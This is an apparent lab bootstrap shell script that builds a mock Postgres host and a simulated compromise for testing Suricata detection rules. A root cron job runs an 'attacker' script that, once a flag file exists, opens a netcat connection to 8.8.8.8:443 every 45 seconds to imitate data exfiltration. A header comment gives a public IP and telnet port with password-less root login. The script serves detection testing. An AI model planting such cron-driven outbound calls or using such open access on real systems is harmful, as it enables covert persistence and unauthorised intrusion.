#!/bin/sh
# Bootstrap Alpine-2 (DB zone, 10.1.200.10)
# Normal:     socat :5432 mock postgres — accepts queries from APP
# Compromised: touch /tmp/compromised → attacker cron exfil DB→8.8.8.8:443 every 90s
# Paste into: telnet 112.137.129.232:5011  (login: root, no password)
set -e

echo "[db] installing packages"
apk add --no-cache socat curl busybox-extras 2>&1 | tail -3

# --- mock postgres responder ---
# Variable reply size based on incoming query:
#   - JOIN / "SELECT *" patterns → return >4KB payload (triggers SID 9000032 dsize>4096)
#   - everything else → terse PG_OK banner (normal baseline)
cat > /usr/local/bin/db-reply.sh <<'REPLY'
#!/bin/sh
# Read first line with short timeout (busybox read -t).
# Clients like `nc` often don't half-close stdin after EOF, so blocking reads hang.
read -t 1 -r QUERY 2>/dev/null || true
case "$QUERY" in
    *JOIN*|*"SELECT *"*)
        # Bulk SELECT — emit ~5KB synthetic rows to trigger DB reply size anomaly
        i=0
        while [ $i -lt 80 ]; do
            printf 'row_%03d | user=user_%03d | order=ORD%05d | data=lorem_ipsum_dolor_sit_amet_padding_filler\n' \
                $i $i $((i * 7 + 1000))
            i=$((i + 1))
        done
        ;;
    *)
        printf 'PG_OK row_count=42 ts=%s\n' "$(date +%s)"
        ;;
esac
REPLY
chmod +x /usr/local/bin/db-reply.sh

cat > /usr/local/bin/db-mock.sh <<'EOF'
#!/bin/sh
# pipes option forces real pipes (not socketpair) — fixes stdout flowing back over TCP
exec socat -d TCP-LISTEN:5432,reuseaddr,fork EXEC:/usr/local/bin/db-reply.sh,pipes
EOF
chmod +x /usr/local/bin/db-mock.sh

cat > /etc/init.d/db-mock <<'OPENRC'
#!/sbin/openrc-run
name="db-mock"
command="/usr/local/bin/db-mock.sh"
command_background=true
pidfile="/run/db-mock.pid"
output_log="/var/log/db-mock.log"
error_log="/var/log/db-mock.log"
# Note: no `need net` — networking is brought up manually on Alpine VMs;
# the openrc net service isn't always started, so don't gate on it.
OPENRC
chmod +x /etc/init.d/db-mock

rc-update add db-mock default 2>&1 | tail -1
# Force stop any running db-mock + stale socat, then start fresh
rc-service db-mock stop 2>&1 | tail -1 || true
pkill -9 -f 'socat.*5432' 2>/dev/null || true
sleep 1
rc-service db-mock start 2>&1 | tail -3

# --- attacker script (runs ON db host, simulates exfil after DB compromise) ---
cat > /usr/local/bin/attacker-db.sh <<'ATTACKER'
#!/bin/sh
# Only runs when /tmp/compromised exists
# Simulates: attacker who pwned DB exfiltrates data outbound (T1041 Exfil over C2)
[ -f /tmp/compromised ] || exit 0
logger -t "attacker-db" "exfiltration attempt: DB→8.8.8.8:443"
nc -w 3 8.8.8.8 443 < /dev/null 2>&1
ATTACKER
chmod +x /usr/local/bin/attacker-db.sh

cat > /etc/crontabs/root <<'CRON'
* * * * * /usr/local/bin/attacker-db.sh
* * * * * sleep 45; /usr/local/bin/attacker-db.sh
CRON

rc-update add crond default 2>&1 | tail -1
service crond restart

sleep 1
# Vanilla read-only probe (busybox nc closes fully after stdin EOF — use </dev/null
# to test reply without sending). Actual Suricata capture is wire-level via tc-mirred,
# so live attacker traffic (which sends + closes) still produces reply bytes on wire.
VANILLA_BYTES=$(nc -w 3 localhost 5432 < /dev/null | wc -c)
echo "← db-mock vanilla reply = ${VANILLA_BYTES} bytes (expect ~33)"
# Bulk path verification (direct script test, bypasses TCP+nc race)
BULK_BYTES=$(echo "SELECT * FROM users JOIN orders" | /usr/local/bin/db-reply.sh | wc -c)
echo "  bulk SELECT reply size = ${BULK_BYTES} bytes via script (expect >4KB for SID 9000032)"
echo "[db] DONE"
echo "  Normal mode  : db-mock :5432 — terse reply for vanilla queries"
echo "  Bulk pattern : JOIN / SELECT * queries → reply >4KB (triggers SID 9000032)"
echo "  Attack mode  : touch /tmp/compromised  (DB→8.8.8.8:443 exfil — SID 9000002)"
